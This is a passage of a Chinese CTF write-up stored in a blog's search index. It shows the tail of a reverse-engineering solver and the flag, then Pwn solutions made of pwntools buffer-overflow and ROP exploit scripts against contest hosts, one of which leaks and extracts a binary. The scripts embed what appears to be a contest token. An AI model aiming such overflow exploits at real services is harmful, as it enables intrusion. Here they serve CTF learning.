<span class="built_in">sub_12A4</span>(i);</span><br><span class="line"><span class="keyword">if</span>(bbq==<span class="number">0LL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>^<span class="number">32</span> - <span class="number">1</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bbq = <span class="built_in">sub_1346</span>(i);</span><br><span class="line"><span class="keyword">if</span>(bbq==<span class="number">0LL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;e3c6235c-05d9434d-04b1edf3-04034083&#125;</span></span><br></pre></td></tr></table></figure><h1>Pwn</h1><h2 id="babypwn">babypwn</h2><ul><li>ret2text</li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;prob07.contest.pku.edu.cn&#x27;</span>, <span class="number">10007</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b<span class="string">&#x27;Please input your token: &#x27;</span>)</span><br><span class="line">p.sendline(b<span class="string">&#x27;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#x27;</span>)</span><br><span class="line">p.recvuntil(b<span class="string">&#x27;Enter your username: &#x27;</span>)</span><br><span class="line">p.sendline(b<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line"></span><br><span class="line">x = b<span class="string">&#x27;!@#$%^&amp;*()_+&#x27;</span></span><br><span class="line"><span class="built_in">offset</span>=<span class="number">0x38</span> - <span class="built_in">len</span>(x)</span><br><span class="line">payload = x + b<span class="string">&#x27;\x00&#x27;</span> * <span class="built_in">offset</span> + p64(<span class="number">0x40117A</span>)</span><br><span class="line">p.recvuntil(b<span class="string">&#x27;Enter the password: &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Login">Login</h2><p>密码处输入字符过长溢出，密码自己出来了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714996681718-deba3f05-beb0-4cd5-9e82-68eaecfb43a3.png#averageHue=%230a0908&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=813&amp;id=u0a997292&amp;originHeight=1219&amp;originWidth=2530&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=222241&amp;status=done&amp;style=none&amp;taskId=u01241050-9a4a-48ce-b0b3-aedfd42c4f8&amp;title=&amp;width=1686.6666666666667" alt="image.png"><br>elf文件泄露，使用脚本提取</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;prob04.contest.pku.edu.cn&#x27;</span>, <span class="number">10004</span>, level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Please input your token: &#x27;</span>,</span><br><span class="line">                b<span class="string">&#x27;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Username:&#x27;</span>, b<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Password:&#x27;</span>, b<span class="string">&#x27;1q2w3e4r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">data</span> = p.recvall()</span><br><span class="line">flag = <span class="keyword">data</span>.find(b<span class="string">&#x27;\x7fELF&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> flag ==-<span class="number">1</span>:</span><br><span class="line">    datas = <span class="keyword">data</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    datas = <span class="keyword">data</span>[flag:]</span><br><span class="line"></span><br><span class="line">with <span class="keyword">open</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(datas)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>提取成功，找到后门<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714996795308-bf233b5b-65dd-4af5-b558-fe74bf5ea687.png#averageHue=%23f9f7f5&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=121&amp;id=u6fa22c66&amp;originHeight=181&amp;originWidth=799&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=13303&amp;status=done&amp;style=none&amp;taskId=ub2c18f58-f686-4613-b1c0-efeb1434234&amp;title=&amp;width=532.6666666666666" alt="798c4c64bc527cfdfb112297a2aba3a.png"><br>找gadgets<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714996814489-e62ce271-ef49-48db-b399-d15b31f702e4.png#averageHue=%23300b25&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=85&amp;id=ub9c3ffa3&amp;originHeight=128&amp;originWidth=684&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=16770&amp;status=done&amp;style=none&amp;taskId=u188da057-fd77-40da-a627-cf123ca2a87&amp;title=&amp;width=456" alt="439b7b4556526a0ec73c101ae0b03e5b_.png"></p><ul><li>exp</li></ul><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="emphasis">&#x27;prob04.contest.pku.edu.cn&#x27;</span>, 10004, level=<span class="emphasis">&#x27;debug&#x27;</span>)</span><br><span class="line">p.sendlineafter(b&#x27;Please input your token: <span class="emphasis">&#x27;,</span></span><br><span class="line"><span class="emphasis">                b&#x27;</span>468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#x27;)</span><br><span class="line">p.sendlineafter(b&#x27;Username: <span class="emphasis">&#x27;, &#x27;</span>admin&#x27;)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"><span class="section">Gadgets information</span></span><br><span class="line"><span class="section">============================================================</span></span><br><span class="line">0x000000000040101a : ret</span><br><span class="line">0x0000000000401359 : ret 0x1be</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload = b&#x27;a&#x27; * 40 <span class="code">+ b&#x27;\x00&#x27; * (41 - 40) +</span> b&#x27;b&#x27; * (48 <span class="code">+ 96 - 41) +</span> p64(0x40101a) * 3 + p64(0x40127e)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&#x27;Password: <span class="emphasis">&#x27;, payload)</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis"></span>p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714998007875-ba0fadb1-4b37-4774-988e-40dc7a35e266.png#averageHue=%2391959a&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=349&amp;id=ub001c975&amp;originHeight=524&amp;originWidth=1194&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=44000&amp;status=done&amp;style=none&amp;taskId=uf5f3f913-75d1-46c3-8d3f-c017298af16&amp;title=&amp;width=796" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
